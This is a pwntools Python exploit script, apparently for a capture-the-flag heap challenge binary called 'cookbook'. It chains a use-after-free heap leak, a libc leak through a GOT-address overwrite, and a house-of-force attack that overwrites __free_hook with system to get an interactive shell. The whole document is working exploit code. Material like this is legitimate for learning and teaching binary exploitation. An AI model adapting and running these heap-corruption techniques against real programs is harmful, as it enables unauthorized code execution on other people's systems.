#!/usr/bin/env python3

from pwn import *
import ctypes
context.binary = elf = ELF("./cookbook_patched")


#context.log_level = 'debug'
libc = elf.libc

io = elf.process()


gs = '''
    set $recipe=0x0804D0A0
    set $ingredient=0x0804d09c
    continue
'''

def sendc(c):
    io.sendline(c)


# recv until '[q]uit'

def recvq():
    io.recvuntil(b"[q]uit\n")

if args.GDB:
    gdb.attach(io, gdbscript=gs)

def groom(times):
    for i in range(times):
        sendc(b'g')
        io.sendlineafter(b' : ',hex(0x5).encode())
        sendc(b'A')
        recvq()

io.sendlineafter(b"your name?", b"/bin/sh\x00")



# leak heap using a use-after-free

sendc(b'c') # [c]reate recipe
sendc(b'n') # [n]ew recipe
sendc(b'a') # [a]dd ingredient

io.sendlineafter(b'ngredient to add? ', b'basil')
io.sendlineafter(b'(hex): ', b'0xdeadbeef')

sendc(b'd') # [d]iscard recipe

sendc(b'p') # [p]rint current recipe

io.recvuntil(b'recipe type: (null)\n\n')

heap = int(io.recv(9)) - 0x16d8 

recvq()
sendc(b'q') # [q]uit
recvq()

log.success(f'heap @ 0x{heap:02x}')

# leak libc


'''
    here i leaked libc by overwriting an ingredient list entry with printf GOT but there is an other way to leak libc address via Uninitialized ingredient 
'''


sendc(b'a') # [a]dd ingredient
sendc(b'n') # [n]ew inredient
sendc(b'g') # [g]ive ingredient name
sendc(b'FUZZ')
sendc(b'p') # [p]rice ingredient
sendc(b'1')
sendc(b's') # [s]et ingredient calories
sendc(b'2')
sendc(b'e') # [e]xport ingredient
sendc(b'q') # [quit]
recvq()

sendc(b'c') # [c]reate a recipe
recvq()
sendc(b'g') # [g]ive recipe a name
sendc(b'A'*0xc + p64(elf.got.printf)) # overwrite ingredient list entry with printf GOT address
recvq()
sendc(b'q') # [q]uit

recvq()

sendc(b'l') # [l]ist current ingredients

io.recvuntil(b'name: olive oil\ncalories: 2\nprice: 3\n------\nname:')
io.recvuntil(b'calories: ')

libc.address = ctypes.c_uint32(int(io.recvline().strip())).value - libc.sym.printf

log.success(f'libc @ 0x{libc.address:02x}')

recvq()

# house of force


groom(0x100) # fill heap holes


sendc(b'c') # [c]reate a recipe
recvq()
sendc(b'n') # [n]ew recipe
recvq()
sendc(b'd') # [d]iscard recipe
recvq()
sendc(b'q') # [q]uit
recvq()

sendc(b'g')
io.sendlineafter(b' : ', hex(0x90).encode())
sendc(b'AB')
recvq()


top_chunk = heap+0x2410

sendc(b'c')
recvq()
sendc(b'i')
sendc(b'A'*0x8 + p32(0xffffffff)) # overwrite the wilderness size with large value
recvq()


distance = libc.sym.__free_hook-0x10-top_chunk


sendc(b'q')
recvq()
sendc(b'g')
io.sendlineafter(b' : ', hex(distance).encode()) # allocate gap between top_chunk and __free_hook
sendc(b'AB')
recvq()

sendc(b'g')
io.sendlineafter(b' : ', hex(0x20).encode()) 

sendc(p32(libc.sym.system)) # overwrite __free_hook with system

recvq()

sendc(b'q')
io.interactive()
